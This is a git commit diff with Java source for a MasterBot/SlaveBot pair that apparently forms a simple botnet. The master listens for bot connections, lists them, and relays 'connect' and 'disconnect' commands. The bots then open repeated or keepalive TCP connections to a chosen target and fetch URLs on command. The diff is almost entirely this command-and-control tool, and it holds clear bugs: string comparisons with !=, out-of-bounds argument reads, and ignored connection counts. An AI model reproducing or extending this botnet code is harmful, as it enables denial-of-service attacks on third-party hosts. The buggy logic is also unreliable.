0e0e9505a83559d4b369b62553428b6884d07ca4
NEEL PATEL <neelpatel3284@gmail.com>
2017-10-19 10:38:40 -0700

    Listing Infromations regarding connected Slaves.

--- MasterBot.java
+++ MasterBot.java
@@ -1,121 +1,270 @@
-import java.net.*;
-import java.io.*;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
+import java.net.ServerSocket;
+import java.net.Socket;
 import java.util.*;
 import java.text.*;
 
-public class MasterBot extends Thread{
-	
-	private ServerSocket ss; 
-MasterBot(int port)
+class socketConnection
 {
-	try {
-		 ss = new ServerSocket(port);  // Attempts to create a server socket bound to the specified port.
-		 
-	} catch (IOException e) {
-		
-		e.printStackTrace();
-		System.exit(-1);   // if it throws exception then it will exit from the code 
-	}
-	
-}
-public void run(){    // run method for every threads ( multiple slaves)
-	while(true)
+	String 	regDate;
+	String 	targetHost;
+	String 	targetName;
+	int	targetPort;
+	Socket 	targetSock;
+	socketConnection()
 	{
-		try{  
-			 Socket st= ss.accept(); /* Waits for an incoming client. 
-			 This method blocks until either a client connects to the server on the specified port.*/
-			 _list.add(st);   // Add to the list which is maintaining the info about all connected slaves.
-		}
-		catch(Exception e) 
+		Date date = new Date();
+		SimpleDateFormat dm = new SimpleDateFormat("yyyy-MM-dd");
+		String format = dm.format(date);
+		regDate=format;
+	}
+}
+
+class SocketThread extends Thread{
+	  int PORTNUMBER;
+	  socketConnection socketList;
+	  SocketThread(int port)
+	  {
+	    PORTNUMBER = port;
+	  }
+	  public void run()
+	  {
+		  try
+		  {
+		   	ServerSocket ss =  new ServerSocket(PORTNUMBER);
+		    while(true)
+		    {
+		    	Socket clientSocket = ss.accept();
+		    	socketList=new socketConnection();
+		    	socketList.targetHost=clientSocket.getInetAddress().getHostAddress();
+		    	socketList.targetName=clientSocket.getInetAddress().getHostName();
+			   	socketList.targetPort=clientSocket.getPort();
+				socketList.targetSock=clientSocket;
+			    MasterBot.connectionList.add(socketList);
+		    }
+		  }
+		  catch(Exception e)
+		  {
+			  e.printStackTrace();
+		  }
+	  }
+}
+
+public class MasterBot {
+  public static String Cmd;
+  public static ArrayList<socketConnection> connectionList;
+  public static void main(String[] args) throws Exception
+  {
+    connectionList = new ArrayList<socketConnection>();
+	if (args.length<2)
+	{
+		System.err.println("Please provide legal arguments.");
+		System.exit(-1);
+	}
+	try
+	{
+		String port="";
+		if (args[0].equals("-p"))
 		{
-			e.printStackTrace();
+			port=args[1];
+		}
+		else
+		{
+			System.err.println("Port number is compulsory for server.");
 			System.exit(-1);
 		}
-	}
-}
-
-static ArrayList<Socket> _list = new ArrayList<Socket>();  //list for all slaves
-
-public static void main(String args[])
-{        
-		try {
-			 int PORTNUMBER; // port number from user
-			 if(args.length<2)// if it is not as "-p port_number"  
-			 {
-				 System.err.println("-p command with Port number should be provided for MasterBot.");
-				 System.exit(-1);
-			 } 
-			 PORTNUMBER=Integer.parseInt(args[1]);
-			 Thread t = new MasterBot(PORTNUMBER); // creates thread
-			 t.start();	// start the thread and it will run parallel 
-			 while(true)
-	         {
-				System.out.print(">");
-				String line; // to store connect and disconnect cmds
-				String[] array;
-				String[] dis_array;
-				int connection=1; // to store number of connections for target host
-				BufferedReader br1 = new BufferedReader(new InputStreamReader(System.in));
-				line = br1.readLine();
-				DateFormat df=new SimpleDateFormat("YYYY/MM/dd"); // this is for specified date format
-			    Date date=new Date();
-			    String regDate=df.format(date);
-				if (line.equals("list")) // to display list
+		SocketThread st = new SocketThread(Integer.parseInt(port));
+		st.start();
+		while(true)
+		{
+			System.out.print(">");
+			BufferedReader Input = new BufferedReader(new InputStreamReader(System.in));
+			Cmd=Input.readLine();
+			if(Cmd.equals("list"))
+			{
+				for(int i=0;i<connectionList.size(); i++)
 				{
-					System.out.println();
-					System.out.println("HostName          "+"IP Address  "+"PORT "+"Date  ");
-		         	for (int i=0; i < _list.size(); i++ )
-		         	{
-		         		System.out.print(" "+_list.get(i).getRemoteSocketAddress()); // Host Name
-		         		System.out.print(" "+_list.get(i).getLocalAddress()); // IP address
-		         		System.out.print(" "+_list.get(i).getLocalPort()); // Port
-		         		System.out.print(" "+regDate);
-		         		System.out.println();
-		         	}
+  					System.out.println(connectionList.get(i).targetName+" "+connectionList.get(i).targetHost + " "+ connectionList.get(i).targetPort + " "+ connectionList.get(i).regDate);
 				}
-				if(line.equals("connect")) // compare the string whether its about connect cmd or not
+			}
+			String[] array = Cmd.split(" ");
+			if(array[0].equals("connect"))
+			{
+				if(array.length<4)
 				{
-					array=line.split("\\s+"); // array for verifying the arguments with connect cmd
-					if(array.length<4)// not as specified 
+					
+					System.out.println("connect requires atleast 3 arguments");
+					System.exit(-1);
+				}
+				else
+				{
+					int numConn;
+					if(array.length>4)
 					{
-						System.out.println("Arguments should be legal to connect with target host.");
-						System.exit(-1);
+						numConn= Integer.parseInt(array[4]);
 					}
-					if(array.length==5) // if no. of connection is already given
+					else
+						numConn=1;
+					Iterator<socketConnection> i = connectionList.iterator();
+					if(array[1].equals("all"))
 					{
-						connection=Integer.parseInt(array[4]);
+						while(i.hasNext())
+						{
+							socketConnection sc=i.next();
+							if(sc.targetHost.equals(array[1]))
+							{
+								try
+								{
+							   	 	PrintWriter pw = new PrintWriter(new OutputStreamWriter(sc.targetSock.getOutputStream()));
+							   		pw.println("connect "+ array[2] + " "+ array[3] + " "+numConn +" "+ array[5]);
+		  							pw.flush();
+								}
+						    	catch (Exception e)
+						    	{
+						    		e.printStackTrace();
+								}
+							 }
+						}
+					}
+					else if(array[1]!="all")
+					{
+						while(i.hasNext())
+						{
+							socketConnection sc=i.next();
+							if(sc.targetName.equals(array[1]))
+							{
+								try
+								{
+									PrintWriter pw = new PrintWriter(new OutputStreamWriter(sc.targetSock.getOutputStream()));
+									pw.println("connect "+ array[2] + " "+ array[3] + " "+numConn +" "+ array[5]);
+	  								pw.flush();
+								}
+								catch (Exception e)
+								{
+									e.printStackTrace();
+								}
+							}
+						}
+				     }
+					 else
+					 {
+						while (i.hasNext())
+						{
+						   	socketConnection sc=i.next();
+							try
+							{
+								PrintWriter pw=new PrintWriter(new OutputStreamWriter(sc.targetSock.getOutputStream()));
+								pw.println("connect "+ array[2] + " "+ array[3] + " "+numConn +" "+ array[5]);
+	  							pw.flush();
+							}
+							catch (Exception e)
+							{
+								e.printStackTrace();
+							}
+						}
+					 }
+				}
+			}
+			if(array[0].equals("disconnect"))
+			{
+				if(array.length<3)
+				{
+					System.out.println("For disconnect command there should be minimum 2 arguments");
+				}
+				else
+				{
+					if(array[1] != null && array[2]!= null)
+					{
+						int disPort=0;
+						if(array.length>3)
+						{
+							disPort= Integer.parseInt(array[3]);
+						}
+						Iterator<socketConnection> i = connectionList.iterator();
+						int flag=1;
+						if(array[1].equals("all"))
+						{
+							flag=3;
+						}
+						else
+						{
+							flag=2;
+						}
+						if(flag==1)
+						{
+							while(i.hasNext())
+							{
+							   	socketConnection sc=i.next();
+								if(sc.targetHost.equals(array[1]))
+								{
+									try
+									{
+										PrintWriter pw=new PrintWriter(new OutputStreamWriter(sc.targetSock.getOutputStream()));
+										pw.println("disconnect "+ array[2] + " "+ disPort);
+										pw.flush();
+									}
+									catch(Exception e)
+									{
+										System.err.println("Error connecting while sending command to socket with "+ sc.targetHost+" " + sc.targetPort);
+									}
+								}
+							}
+						}
+						if(flag==2)
+						{
+							while(i.hasNext())
+							{
+								socketConnection sc=i.next();
+								if(sc.targetName.equals(array[1]))
+								{
+									try
+									{
+										PrintWriter pw=new PrintWriter(new OutputStreamWriter(sc.targetSock.getOutputStream()));
+										pw.println("disconnect "+ array[2] + " "+ disPort);
+										pw.flush();
+									}
+									catch(Exception e)
+									{
+										System.err.println("Error connecting while sending command to socket with "+ sc.targetHost+" " + sc.targetPort);
+									}
+								}
+							}
+						}
+						if(flag==3)
+						{
+							while(i.hasNext())
+							{
+							   	socketConnection sc=i.next();
+								try
+								{
+									PrintWriter pw=new PrintWriter(new OutputStreamWriter(sc.targetSock.getOutputStream()));
+									pw.println("disconnect "+ array[2] + " "+ disPort);
+  									pw.flush();
+								}
+								catch(Exception e)
+								{
+									System.err.println("Error connecting while sending command to socket with "+ sc.targetHost+" " + sc.targetPort);
+								}
+							}
+						}
+
 					}
 					else
 					{
-						connection=1;
-					}
-					int port_=Integer.parseInt(array[3]);
-					String host_name=array[1];
-					String target=array[2];
-					//calling method for making connection to target_host.
-					//connection_targethost(host_name,port_,target,connection);
-					
-				}
-				if(line.equals("disconnect"))
-				{
-					dis_array=line.split("\\s+");
-					if(dis_array.length<3)
-					{
-						System.out.println("Arguments should be legal to disconnect with target host.");
+						System.out.println("Illegal arguments for disconnect");
 						System.exit(-1);
 					}
-					if(dis_array.length==4)
-					{
-						int Port;
-						Port=Integer.parseInt(dis_array[3]);
-					}
 				}
-	         }
-		}
-		catch(Exception e) 
-		{	
-			e.printStackTrace();
-			System.exit(-1);
+			}
 		}
 	}
+	catch (Exception e)
+	{
+      	e.printStackTrace();
+      	System.exit(-1);
+	}
+  }
 }
--- SlaveBot.java
+++ SlaveBot.java
@@ -1,28 +1,248 @@
+import java.io.BufferedReader;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLConnection;
+import java.util.*;
+import java.text.*;
 
-import java.io.*;
-import java.net.*;
 
-public class SlaveBot 
-{
-    public static void main(String args[])
-    {
-	try {
-        int port_number;
-        if(args.length<4)// check whether arguments are as expected or not 
-        {
-         System.err.println("PortNumber and HostName should be provided for client.");
-       	 System.exit(-1);
-        }
-        
-        			String hostname=args[1];// store the host name
-        			port_number=Integer.parseInt(args[3]); //store the port_number 
-        			Socket slave=new Socket(hostname,port_number); //It attempts to connect to the specified server at the specified port.
-        			System.out.println("Slave is connected.");
-        	
-        
-        } catch (Exception ex) {
-            
-        }
-    }
+class Connection{
+String 	Date;
+String 	HostIP;
+String 	HostName;
+int	PORT;
+Socket 	ss;
+  	Connection() {
+  		Date date = new Date();
+  		SimpleDateFormat f = new SimpleDateFormat("yyyy-MM-dd");
+  		String format = f.format(date);
+  		Date=format;
+  }
 }
+
+
+public class SlaveBot {
+
+  public static ArrayList<Connection> ls;
+  public static Socket s;
+
+  public static void main(String[] args) throws Exception
+  {
+	if (args.length<4)
+	{
+	  System.err.println("port number and host details are compulsory.");
+	  System.exit(-1);	
+	}
+	String hname = "";
+	String p = "";
+
+	for(int t=0; t<3; t++)
+	{
+		if(args[t].equals("-h"))
+		{
+			hname=args[t+1];
+		}
+		
+		else if(args[t].equals("-p"))
+		{
+			p=args[t+1];
+		}
+	}
+
+    if (hname.equals("") || p.equals(""))
+    {	
+    	System.err.println("port number is compulsory.");
+    	System.exit(-1);
+	}
+
+    ls = new ArrayList<Connection>();
+	try{
+    		Integer.parseInt(p);
+	}
+	catch(Exception e)
+	{
+		System.err.println("port number always be in integer.");
+		System.exit(-1);
+	}
+    s = new Socket(hname, Integer.parseInt(p));
+    BufferedReader netIn = new BufferedReader(new InputStreamReader(s.getInputStream()));
+    Connection socketList;
+    while(true)
+    {
+    	try
+    	{
+    		String str = netIn.readLine();
+    		if(str !="")
+    		{
+    			String[] Cmd = str.split(" ");
+    			if(Cmd[0].equals("connect"))
+    			{
+    				if(Cmd[1] != null && Cmd[2]!= null && Cmd[3]!= null)
+    				{    	
+    					String target_hostname = Cmd[1];
+    					int target_port = Integer.parseInt(Cmd[2].toString());
+    					int n=1;
+			
+    					Socket targetSocket;
+    					for (int i=0; i< n; i++)
+    					{
+    						try 
+    						{	
+				    			targetSocket = new Socket(InetAddress.getByName(target_hostname), target_port);
+							    socketList=new Connection();
+							    socketList.HostIP=targetSocket.getInetAddress().getHostAddress();
+							    socketList.HostName=targetSocket.getInetAddress().getHostName();
+							    socketList.PORT=target_port;
+							    socketList.ss=targetSocket;
+							    ls.add(socketList);
+							    if(Cmd[4].equals("keepalive"))
+							    	targetSocket.setKeepAlive(true);
+							    if(Cmd[4].contains("url"))
+							    	SendHttpCommand(Cmd[4]);
+							    System.out.println(" connectted to " +targetSocket.getInetAddress().getHostName()+":"+ targetSocket.getInetAddress().getHostAddress()+" at local port:  " + targetSocket.getLocalPort()+" setkeepalive= "+targetSocket.getKeepAlive());
+	            			} 
+    						catch(Exception e)
+    						{
+    							e.printStackTrace();
+    							System.exit(-1);
+    						}
+
+    					}
+			
+    				}
+    				else
+    				{
+    					System.out.println("Illegal arguments for connect");
+    					System.exit(-1);
+    				}
+
+    			}
+    			else if(Cmd[0].equals("disconnect"))
+    			{
+    				if(Cmd[1]!= null )
+    				{ 
+	
+    					ArrayList<Connection> s = new ArrayList<Connection>();
+    					Iterator iterator = ls.iterator();
+    					while (iterator.hasNext())
+    					{
+    						Connection o = (Connection) iterator.next();
+    						if(!s.contains(o)) s.add(o);
+    					}
+			
+    					int flag=0;
+    					String target = Cmd[1];
+
+    					if (target!="all"){flag=1; }
+    					else {	flag=0;}
+
+    					int target_port=0;
+    					if(Cmd[2]!= null )
+    					{			
+    						target_port= Integer.parseInt(Cmd[2].toString());
+    					}
+    					Iterator<Connection> it = s.iterator();
+    					if(flag==1)
+    					{ 
+    						while(it.hasNext()) 
+    						{
+    							Connection s1 = it.next();
+    							if(target_port==0)
+    							{
+    								if(s1.HostIP.equals(target))
+    								{
+    									s1.ss.close();
+    									it.remove();
+    								}
+    							}
+    							else
+    							{
+    								if(s1.HostIP.equals(target) && s1.PORT==target_port)
+    								{
+    									s1.ss.close();
+    									it.remove();
+    								}
+    							} 
+    						}
+    					}
+    					else if(flag==0)
+    					{	
+    						while (it.hasNext())
+    						{
+    							Connection s1 = it.next(); 
+    							if(target_port==0)
+    							{
+    								if(s1.HostName.equals(target))
+    								{
+    									s1.ss.close();
+    									it.remove();
+    								}
+    							}
+    							else
+    							{
+    								if(s1.HostName.equals(target) && s1.PORT==target_port)
+    								{
+    									s1.ss.close();
+    									it.remove();
+    								}
+    							}
+				   
+    						}
+    					}	
+    				}
+    			}
+    			else
+    			{
+    				System.out.println("Illegal arguments for disconnect");
+    				System.exit(-1);
+    			}	
+    		}
+    		else
+    		{
+    			System.out.println(" Illegal command. ");
+    			System.exit(-1);
+    		}
+    	}
+		catch (Exception e) 
+		{
+	      	e.printStackTrace();
+	      	System.exit(-1);
+		}  	
+    }  
+ }
+
+private static void SendHttpCommand(String str) {
+	str=str.replace("url=", "");
+	URL u;
+	try{
+		u = new URL(str);		
+		URLConnection c = u.openConnection();		
+    	BufferedReader in = new BufferedReader(
+    							new InputStreamReader(
+    									c.getInputStream()));		
+    	String input;                
+    	input = in.readLine();        	
+    	if(input==null)
+    		System.out.println("Not recieved anything.");
+    	else	
+    		in.close();        	
+        if(input.contains("doctype"))
+        	System.out.println("request is correct");
+        else{
+        	System.out.println("Illegal request");
+        }
+	} catch (IOException e) {
+		e.printStackTrace();
+	}
+	
+}
+
+}
+
 
